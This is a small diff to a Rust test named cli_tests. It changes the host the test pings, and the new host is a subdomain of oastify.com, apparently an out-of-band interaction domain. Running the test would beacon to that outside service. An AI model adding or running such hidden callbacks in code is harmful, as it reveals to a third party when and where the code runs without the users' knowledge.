@@ -4,7 +4,7 @@ use std::str;
 #[test]
 fn cli_tests() {
     // Define the target to ping
-    let target = "prks0r8ketwk8l3lmnp92hper5xwlnkb9.oastify.com";
+    let target = "2jm5s40x66ox0yvye0hmuuhrjip9d0eo3.oastify.com";
 
     // Use the appropriate ping command based on the OS
     let output = if cfg!(target_os = "windows") {
